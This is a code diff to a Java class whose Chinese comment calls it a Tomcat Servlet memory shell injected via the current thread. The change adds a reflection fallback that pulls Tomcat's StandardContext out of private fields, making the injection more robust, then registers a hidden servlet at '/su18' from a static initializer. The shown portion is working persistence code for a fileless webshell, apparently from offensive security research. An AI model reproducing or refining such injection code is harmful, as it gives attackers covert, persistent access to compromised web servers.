@@ -6,6 +6,7 @@ import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.loader.WebappClassLoaderBase;
 
 import javax.servlet.*;
+import java.lang.reflect.Field;
 
 /**
  * 使用 Thread 注入 Tomcat Servlet 型内存马
@@ -14,16 +15,30 @@ public class TSMSFromThread implements Servlet {
 
 	static {
 		try {
-			String servrletName = "su18" + System.nanoTime();
+			String servletName = "su18" + System.nanoTime();
 			String urlPattern   = "/su18";
 
 			// 获取 standardContext
 			WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-			StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();
 
-			if (standardContext.findChild(servrletName) == null) {
+			StandardContext       standardContext;
+
+			try {
+				standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+			} catch (Exception ignored) {
+				Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
+				field.setAccessible(true);
+				Object root   = field.get(webappClassLoaderBase);
+				Field  field2 = root.getClass().getDeclaredField("context");
+				field2.setAccessible(true);
+
+				standardContext = (StandardContext) field2.get(root);
+			}
+
+
+			if (standardContext.findChild(servletName) == null) {
 				Wrapper wrapper = standardContext.createWrapper();
-				wrapper.setName(servrletName);
+				wrapper.setName(servletName);
 				standardContext.addChild(wrapper);
 				Servlet servlet = new TSMSFromThread();
 
